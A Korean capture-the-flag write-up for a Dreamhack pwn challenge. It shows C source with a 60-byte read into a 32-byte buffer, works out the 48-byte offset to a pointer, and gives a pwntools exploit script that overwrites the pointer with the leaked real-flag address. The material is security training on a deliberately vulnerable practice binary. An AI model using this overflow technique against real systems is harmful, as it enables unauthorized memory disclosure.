## 문제 설명

프로그램의 취약점을 찾고 익스플로잇하여 플래그를 출력하세요.

플래그는 `./flag` 파일에 위치합니다.

플래그의 형식은 `DH{...}` 입니다.

---

## 서비스 분석

```c
// Name: chall.c
// Compile: gcc -fno-stack-protector chall.c -o chall

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>

#define FLAG_SIZE 0x45

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}

int main(int argc, char *argv[]) {
    int len;
    char * fake_flag_addr;
    char buf[0x20];
    int fd;
    char * real_flag_addr;

    initialize();

    fd = open("./flag", O_RDONLY);
    len = FLAG_SIZE;
    fake_flag_addr = "DH{****************************************************************}";

    printf("fake flag address: %p\n", fake_flag_addr);
    printf("buf address: %p\n", buf);

    real_flag_addr = (char *)mmap(NULL, FLAG_SIZE, PROT_READ, MAP_PRIVATE, fd, 0);
    printf("real flag address (mmapped address): %p\n", real_flag_addr);

    printf("%s", "input: ");
    read(0, buf, 60);

    mprotect(real_flag_addr, len, PROT_NONE);

    write(1, fake_flag_addr, FLAG_SIZE);
    printf("\nbuf value: ");
    puts(buf);

    munmap(real_flag_addr, FLAG_SIZE);
    close(fd);

    return 0;
}
```
{: file="chall.c"}

코드를 분석하면 두 가지 핵심 포인트를 확인할 수 있다.

**첫째, 버퍼 오버플로우 취약점이 존재한다.**
`buf`는 `0x20`(32바이트)만큼 할당되어 있지만 `read()`에서 60바이트를 읽어오므로
28바이트 초과 입력이 가능하다.

**둘째, 요상한 출력 구조를 가지고 있다.**
`mprotect(real_flag_addr, len, PROT_NONE)`으로 실제 플래그 메모리의 접근 권한을 막은 뒤,
`write()`로 `fake_flag_addr`를 출력한다. 즉 `puts(buf)`로 출력되는 것은 `fake_flag_addr`가 가리키는 가짜 플래그다.

프로그램이 친절하게 `fake_flag_addr`와 `real_flag_addr`를 모두 출력해주므로,
`real_flag_addr` 값을 받아 BOF로 `fake_flag_addr`를 덮어쓰면
`write()`가 실제 플래그를 출력하게 된다.

## 풀이

### Offset 계산

![disas](/assets/img/posts/mmapped/buf주소.png)
> `buf`의 주소: `rbp-0x40`

![disas](/assets/img/posts/mmapped/fake_flag_addr.png)
> `fake_flag_addr`의 주소: `rbp-0x10`

`buf`(`rbp-0x40`)부터 `fake_flag_addr`(`rbp-0x10`)까지의 거리는
`0x40 - 0x10 = 0x30` = **48바이트**다.

### Exploit

48바이트 패딩 이후에 `real_flag_addr` 값을 덮어쓰면
`write(1, fake_flag_addr, FLAG_SIZE)` 호출 시 실제 플래그가 출력된다.

```py
from pwn import *
context.log_level = "debug"

p = remote("host3.dreamhack.games", 9401)

data = p.recvuntil(b"input: ")
words = data.split()

# real flag address는 출력 문자열에서 words[12]에 위치
print("real_flag_addr:", words[10], words[11], words[12])

real_flag_addr = words[12]
flag_addr = int(real_flag_addr, 16)
print(hex(flag_addr))

payload  = b"A" * 48       # buf - fake_flag_addr 오프셋
payload += p64(flag_addr)  # fake_flag_addr를 real_flag_addr로 덮어씀

p.sendline(payload)
p.interactive()
```
